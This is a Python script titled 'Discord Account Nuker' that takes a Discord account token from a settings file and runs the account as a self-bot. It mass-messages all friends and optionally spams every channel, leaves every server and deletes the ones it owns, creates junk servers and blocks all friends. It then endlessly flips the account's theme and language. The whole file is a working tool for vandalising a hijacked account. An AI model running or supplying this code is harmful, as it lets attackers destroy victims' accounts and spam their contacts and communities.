error = False
try:
    import os
    os.system("title " + "Discord Account Nuker,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass
try:
    import colorama, requests, discord
    from discord.ext import commands
except:
    error = True
if error == True:
    print("Missing Modules, Press Enter To Start Repair Process (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install discord")
        os.system("pip install colorama")
        os.system("pip install requests")
        print("Error May Be Fixed Now, Restart The Program")
        input("")
        exit()
    except:
        print("Failed To Fix")
        input("")
        exit()




colorama.init(autoreset=True)

import json, time

try:
  json_data = open("settings.json")
  json_data = json.load(json_data)
  token = str(json_data["token"])
except Exception:
  print('Missing "settings.json" File, It Stores All Settings')
  input("")
  exit()



bot = commands.Bot(command_prefix="", self_bot=True)


@bot.event
async def on_message(ctx):
    pass





@bot.event
async def on_ready():
    mass_dm = input("Enter Message To Mass Dm: ")

    while True:
        yure = input("Want To Send An Message In Every Possible Channel (y/n, May Take Alot Of Time): ")

        if yure == "y":
            otherdm = input("Enter What To Send In All Channels In All Servers Its In: ")
            break
        if yure == "n":
            break
        if yure != "y" and yure != "n":
            print("Enter A Valid Choice")

    while True:
        try:
            amount_serv = input("Enter Amount Of Servers: ")
            amount_serv = int(amount_serv)
            amount_serv = str(amount_serv)
            break
        except:
            print("Enter A Valid Choice")


    while True:
        try:
            name_serv = input("Enter Name Of Servers (Name Cannot Only Be An Number): ")
            name_serv = int(name_serv)
            print("Enter A Valid Choice")
        except:
            name_serv = str(name_serv)
            break


    done = 0
    friends_id = []
    for user in bot.user.friends:
        try:
            await user.send(mass_dm)
            done = int(done) + 1
            try:
                print(colorama.Fore.GREEN + f"[{str(done)}] Sent Message To " + str(user.id) + "/" + str(user.name))
            except:
                print(colorama.Fore.GREEN + f"[{str(done)}] Sent Message To " + str(user.id))
            friends_id.append(str(user.id))
        except Exception as e:
            print(colorama.Fore.RED + "Unkown Error")
    print(colorama.Fore.GREEN + "[+] Done Mass Dming")




    if yure == "y":
        for guild in bot.guilds:
            for channel in guild.channels:
                try:
                    await channel.send(otherdm)
                    print(colorama.Fore.GREEN + f"[+] Sent Message In Server, Server Id: {str(guild.id)}, Channel Id: {str(channel.id)}")
                except:
                    pass
        print(colorama.Fore.GREEN + "[+] Done Sending Messaage In Every Channel Possible")







    url = "https://discord.com/api/v9/users/@me/guilds/"

    try:
        print(colorama.Fore.GREEN + f"[+] Started Leaver On {bot.user.name}")
        ids = []
        ide = 0
        for server in bot.guilds:
          id = server.id
          ids.append(str(id))
          ide = int(ide) + 1
          print(colorama.Fore.GREEN + f"[{str(ide)}] Scraped Server Id")
    except Exception as e:
      print(colorama.Fore.RED + "[-] Invalid Token")
    if ids == []:
      print(colorama.Fore.RED + f"[{str(bot.user.name)}] Had No Servers To Leave)")
    left = 0
    for idr in ids:
      idr = str(idr)
      while True:
        try:
          headers = {"authorization": token,
          "lurking": "false"
          }
          re = requests.delete(url+str(idr), headers=headers)
          re = str(re)
          if "204" in re:
            left = int(left) + 1
            print(colorama.Fore.GREEN + f"[{str(bot.user.name)}, {str(left)}] Succsesfully Left Server " + str(idr))
            break
          if "400" in re:
            print(colorama.Fore.RED + f"[{str(bot.user.name)}] Unkown Error, With " + str(idr))
            break
          if "429" in re:
            print(colorama.Fore.RED + f"[{str(bot.user.name)}] Rate Limited, Retrying")
        except:
          print(colorama.Fore.RED + "UNKOWN ERROR")
          break
    print(colorama.Fore.GREEN + "[+] Done Leaving Servers")


    ids = []
    idsdone = 0
    for guild in bot.guilds:
        ids.append(guild.id)
        idsdone = int(idsdone) + 1
        print(colorama.Fore.GREEN + f"[{str(idsdone)}] Scaped Id "+str(guild.id))
    for id in ids:
        url7 = f"https://discord.com/api/v9/guilds/{str(id)}/delete"
        while True:
            ri = requests.post(url=url7, headers=headers)
            if "204" in str(ri):
                print(colorama.Fore.GREEN + "[+] Deleted Server "+str(id))
                break
            if "204" not in str(ri) and "429" not in str(ri):
                pass
                break
            if "429" in str(ri):
                print(colorama.Fore.YELLOW + "[+] Rate Limited")
    print(colorama.Fore.GREEN + "[+] Done Deleting All Servers Account Owns")
    


    den = 0
    for e in range(int(amount_serv)):
        den = int(den) + 1
        try:
            await bot.create_guild(name_serv)
            print(colorama.Fore.GREEN + f"[{str(den)}] Created Guild/Server")
        except:
            print(colorama.Fore.RED + "Max Servers Reached/Name Not Valid")
    print(colorama.Fore.GREEN + "[+] Done Mass Creating Servers")



    head = {
        "authorization": token
    }
    jso = {
        "type": 2
    }
    url3 = "https://discord.com/api/v9/users/@me/relationships/"

    for ida in friends_id:
        while True:
            url4 = url3 + ida
            r5 = requests.put(url4, headers=head, json=jso)
            r5 = str(r5)
            if "204" in r5:
                print(colorama.Fore.GREEN + "[+] Blocked Friend, Id Of User "+str(ida))
                break
            if "429" in r5:
                print(colorama.Fore.YELLOW + "[-] Rate Limited")
    print(colorama.Fore.GREEN + "[+] Done Blocking All Friends")


    ior = "https://discord.com/api/v9/users/@me/settings"
    jso2 = {"theme": "light"}
    jso4 = {"theme": "dark"}


    rog = requests.patch(ior, headers=head, json=jso2)
    rog = str(rog)
    if "200" in rog:
        print(colorama.Fore.GREEN + "[+] Set Light Mode As Theme")
    if "200" not in rog:
        print(colorama.Fore.RED + "[+] Failed To Set Light Mode As Theme")
    print(colorama.Fore.GREEN + "[+] Done Setting Theme")

    jso3 = {
        "locale": "zh-TW"
    }
    jso5 = {
        "locale": "en-GB"
    }
    rog2 = requests.patch(ior, headers=head, json=jso3)
    rog2 = str(rog2)
    if "200" in rog2:
        print(colorama.Fore.GREEN + "[+] Set Chinese As Language")
    if "200" not in rog2:
        print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")
    print(colorama.Fore.GREEN + "[+] Done Setting Language")


    print(colorama.Fore.GREEN + "[+] Done Nuking Account, You May Close This Program Now Or Press Enter To Start An Auto Language And Theme Switcher")
    input("")
    while True:
        rog2 = requests.patch(ior, headers=head, json=jso3)
        rog2 = str(rog2)
        if "200" in rog2:
            print(colorama.Fore.GREEN + "[+] Set Chinese As Language")
        if "200" not in rog2:
            print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")

        
        rog = requests.patch(ior, headers=head, json=jso2)
        rog = str(rog)
        if "200" in rog:
            print(colorama.Fore.GREEN + "[+] Set Light Mode As Theme")
        if "200" not in rog:
            print(colorama.Fore.RED + "[+] Failed To Set Light Mode As Theme")

        





        rog2 = requests.patch(ior, headers=head, json=jso5)
        rog2 = str(rog2)
        if "200" in rog2:
            print(colorama.Fore.GREEN + "[+] Set English As Language")
        if "200" not in rog2:
            print(colorama.Fore.RED + "[-] Failed To Set Language As English")

        
        rog = requests.patch(ior, headers=head, json=jso4)
        rog = str(rog)
        if "200" in rog:
            print(colorama.Fore.GREEN + "[+] Set Dark Mode As Theme")
        if "200" not in rog:
            print(colorama.Fore.RED + "[+] Failed To Set Dark Mode As Theme")
        time.sleep(1)
        






bot.run(token, bot=False)
